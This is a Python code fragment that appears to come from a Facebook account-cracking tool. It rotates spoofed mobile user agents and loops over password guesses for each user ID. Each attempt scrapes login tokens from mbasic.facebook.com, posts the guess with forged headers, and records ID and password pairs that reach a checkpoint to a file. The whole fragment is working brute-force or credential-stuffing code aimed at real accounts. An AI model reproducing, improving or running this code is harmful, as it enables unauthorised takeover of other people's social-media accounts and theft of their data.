...
for xd in range(10000):
	...
	d='Redmi 01A Build/01AQKQ1.191014.001; wv)'
...
for brayen in range(10000):
    rr = random.randint
    rc = random.choice
    u1 = f"Opera/9.80 (Series 60; Opera Mini/7.1.32453/191.343; U; en) Presto/2.12.423 Version/12.16"
    u2 = f"SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0 [ip:134.209.137.157]"
    u3 = f"Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaC6-01/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1"
    u4 = f"Mozilla/5.0 (SymbianOS; Series60; Nokia5310XpressMusic/1.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) Mobile Safari/533.4"
    u5 = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
...
def validate2(idf,pwv):
	...
	for pw in pwv:
		try:
			link = ses.get("https://mbasic.facebook.com/login/device-based/password/?uid="+idz+"&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F0d7197f4669d47e385edd297ad1e94ab%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D1311483179548747%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbddcf290-5a3c-497a-920a-e457b61f38a7%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F0d7197f4669d47e385edd297ad1e94ab%252Fcallback%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={
                "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
				"uid":idz,
				"next":"https://mbasic.facebook.com/v16.0/dialog/oauth?state=https%3A%2F%2Fsocial.yandex.com%2Fbroker2%2F0d7197f4669d47e385edd297ad1e94ab%2Fcallback&redirect_uri=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect&response_type=code&client_id=1311483179548747&scope=email%2Cuser_birthday%2Cuser_gender%2Cuser_link&display=touch&ret=login&fbapp_pres=0&logger_id=bddcf290-5a3c-497a-920a-e457b61f38a7&tp=unspecified",
				"flow":"login_no_pin",
				"pass":pw,
                         }
			koki = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			...
			heade={
    			...
    			"sec-fetch-user": "?1",
    			"sec-fetch-dest": "document",
    			"referer": "https://mbasic.facebook.com/login/device-based/password/?uid="+idz+"&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F0d7197f4669d47e385edd297ad1e94ab%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D1311483179548747%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbddcf290-5a3c-497a-920a-e457b61f38a7%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F0d7197f4669d47e385edd297ad1e94ab%252Fcallback%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
    			"accept-encoding": "gzip, deflate, br, zstd",
    			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
						 }
			po = ses.post(f"https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r {P}■ {K}{idz}{P}|{K}{pw}')
				open('CP/'+cpc,'a').write(idz+'|'+pw+'\n')
				akun.append(idz+'='+pw)
